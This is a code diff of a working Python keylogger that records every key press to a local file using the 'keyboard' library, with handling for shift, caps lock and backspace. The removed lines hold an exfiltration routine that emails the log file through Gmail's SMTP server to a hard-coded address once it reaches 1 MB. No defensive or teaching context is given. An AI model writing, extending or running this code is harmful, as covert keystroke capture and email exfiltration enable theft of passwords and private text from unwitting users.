@@ -1,57 +1,56 @@
-import smtplib
-from email.mime.multipart import MIMEMultipart
-from email.mime.text import MIMEText
-from email.mime.base import MIMEBase
-from email import encoders
 import keyboard
 
-sender_email = "thisanewcodehowareyou@gmail.com"
-receiver_email = "thisanewcodehowareyou@gmail.com"
-subject = "Keystrokes Log"
-body = "Please find the attached keystrokes log file."
-
-def send_email_with_attachment(filename):
-
-    message = MIMEMultipart()
-    message["From"] = sender_email
-    message["To"] = receiver_email
-    message["Subject"] = subject
-
-    message.attach(MIMEText(body, "plain"))
-
-    with open(filename, "rb") as attachment:
-
-        part = MIMEBase("application", "octet-stream")
-        part.set_payload(attachment.read())
-
-    encoders.encode_base64(part)
-
-    part.add_header(
-        "Content-Disposition",
-        f"attachment; filename= {filename}",
-    )
-
-    message.attach(part)
-    text = message.as_string()
-
-    with smtplib.SMTP("smtp.gmail.com", 587) as server:
-        server.starttls()
-        server.login(sender_email, "your_password")  
-        server.sendmail(sender_email, receiver_email, text)
+backspace_count = 0
 
 def on_key(event):
+    global backspace_count
+
     key = event.name
-    with open("keystrokes.txt", "a") as file:
-        file.write(key + "\n")
 
-    file_size_threshold = 1 * 1024 * 1024  
-    if file.tell() > file_size_threshold:
-        file.close()
-        send_email_with_attachment("keystrokes.txt")
-        with open("keystrokes.txt", "w") as file:
-            pass
+    # Check if Caps Lock is active
+    caps_lock_active = keyboard.is_pressed('caps lock')
 
-keyboard.on_press(on_key)
+    if key == 'space':
+        with open('captured_keystrokes.txt', 'a') as file:
+            file.write(' ')
+    elif key == 'enter':
+        with open('captured_keystrokes.txt', 'a') as file:
+            file.write('\n')
+    elif key == 'caps lock':
+        with open('captured_keystrokes.txt', 'a') as file:
+            file.write('\nCAPS LOCK\n')
+    elif key == 'backspace':
+        backspace_count += 1
+    elif key == 'shift':
+        pass  # Ignore Shift key press
+    else:
+        if backspace_count > 0:
+            with open('captured_keystrokes.txt', 'a') as file:
+                file.write(f'[ BAC{backspace_count} ]')
+            backspace_count = 0
 
-while True:
-    keyboard.wait()
+        # Check if Shift key is pressed
+        shift_pressed = keyboard.is_pressed('shift')
+        if shift_pressed or caps_lock_active:
+            key = key.upper()
+        else:
+            key = key.lower()
+
+        with open('captured_keystrokes.txt', 'a') as file:
+            file.write(key)
+
+    with open('captured_keystrokes.txt', 'r') as file:
+        content = file.read().replace('\n', '')
+
+    if len(content) % 200 == 0:
+        with open('captured_keystrokes.txt', 'a') as file:
+            file.write('\n')
+
+def main():
+    keyboard.on_press(on_key)
+    while True:
+        if keyboard.is_pressed('esc'):
+            break
+
+if __name__ == '__main__':
+    main()
